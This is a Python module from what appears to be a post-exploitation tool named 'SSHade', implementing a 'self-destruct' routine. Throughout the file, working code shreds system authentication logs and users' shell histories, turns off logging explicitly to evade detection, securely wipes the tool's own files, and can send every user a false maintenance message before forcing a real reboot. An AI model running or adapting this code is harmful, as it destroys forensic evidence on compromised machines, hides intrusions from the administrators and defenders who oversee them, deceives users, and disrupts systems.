#!/usr/bin/env python3
"""
Self-destruct mechanism for SSHade post-exploitation tool.
Securely removes traces and optionally fakes system reboot.
"""

import os
import shutil
import subprocess
import logging
from pathlib import Path
from typing import List, Optional
import time

# Suppress logging to avoid detection
logging.getLogger().setLevel(logging.CRITICAL)

class SelfDestruct:
    """Secure self-destruct mechanism for SSHade"""
    
    def __init__(self):
        self.log_files = [
            "/var/log/auth.log",
            "/var/log/syslog", 
            "/var/log/messages",
            "/var/log/secure",
            "~/.bash_history",
            "~/.zsh_history",
            "~/.history"
        ]
        
    def secure_delete_file(self, file_path: str) -> bool:
        """Securely delete a single file using shred or fallback methods"""
        try:
            # Expand user path
            file_path = os.path.expanduser(file_path)
            
            if not os.path.exists(file_path):
                return True
                
            # Try shred first (most secure)
            try:
                result = subprocess.run(
                    ["shred", "-u", "-z", "-n", "3", file_path],
                    capture_output=True,
                    timeout=30
                )
                if result.returncode == 0:
                    return True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
                
            # Fallback: overwrite with random data then delete
            try:
                with open(file_path, 'wb') as f:
                    # Write random data multiple times
                    for _ in range(3):
                        f.seek(0)
                        f.write(os.urandom(os.path.getsize(file_path)))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(file_path)
                return True
            except (OSError, IOError):
                # Final fallback: just delete
                try:
                    os.remove(file_path)
                    return True
                except OSError:
                    return False
                    
        except Exception:
            return False
    
    def secure_delete_directory(self, dir_path: str) -> bool:
        """Securely delete a directory and its contents"""
        try:
            dir_path = os.path.expanduser(dir_path)
            
            if not os.path.exists(dir_path):
                return True
                
            # Delete all files in directory first
            for root, dirs, files in os.walk(dir_path, topdown=False):
                for file in files:
                    file_path = os.path.join(root, file)
                    self.secure_delete_file(file_path)
                    
                # Remove empty directories
                for dir_name in dirs:
                    dir_to_remove = os.path.join(root, dir_name)
                    try:
                        os.rmdir(dir_to_remove)
                    except OSError:
                        pass
                        
            # Remove the main directory
            try:
                shutil.rmtree(dir_path, ignore_errors=True)
                return True
            except OSError:
                return False
                
        except Exception:
            return False
    
    def clear_logs(self) -> None:
        """Clear common Linux log files"""
        for log_file in self.log_files:
            self.secure_delete_file(log_file)
    
    def fake_reboot(self) -> bool:
        """Fake a system reboot using wall and systemctl"""
        try:
            # Send reboot message to all users
            try:
                subprocess.run(
                    ["wall", "System will reboot in 30 seconds for maintenance"],
                    capture_output=True,
                    timeout=5
                )
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
                
            # Wait a bit then trigger reboot
            time.sleep(2)
            
            # Try systemctl reboot
            try:
                subprocess.run(
                    ["systemctl", "isolate", "reboot.target"],
                    capture_output=True,
                    timeout=10
                )
                return True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
                
            # Fallback: try reboot command
            try:
                subprocess.run(
                    ["reboot"],
                    capture_output=True,
                    timeout=10
                )
                return True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
                
            return False
            
        except Exception:
            return False
    
    def self_destruct(self, files_to_remove: List[str], clear_logs: bool = True, fake_reboot: bool = False) -> bool:
        """
        Main self-destruct function
        
        Args:
            files_to_remove: List of file/directory paths to securely delete
            clear_logs: Whether to clear common log files
            fake_reboot: Whether to fake a system reboot
            
        Returns:
            bool: True if self-destruct completed successfully
        """
        try:
            # Clear logs first
            if clear_logs:
                self.clear_logs()
            
            # Securely delete all specified files/directories
            for path in files_to_remove:
                if os.path.isfile(path):
                    self.secure_delete_file(path)
                elif os.path.isdir(path):
                    self.secure_delete_directory(path)
            
            # Fake reboot if requested
            if fake_reboot:
                self.fake_reboot()
                
            return True
            
        except Exception:
            return False


def self_destruct(files_to_remove: List[str], clear_logs: bool = True, fake_reboot: bool = False) -> bool:
    """
    Convenience function for self-destruct mechanism
    
    Args:
        files_to_remove: List of file/directory paths to securely delete
        clear_logs: Whether to clear common log files  
        fake_reboot: Whether to fake a system reboot
        
    Returns:
        bool: True if self-destruct completed successfully
    """
    destructor = SelfDestruct()
    return destructor.self_destruct(files_to_remove, clear_logs, fake_reboot) 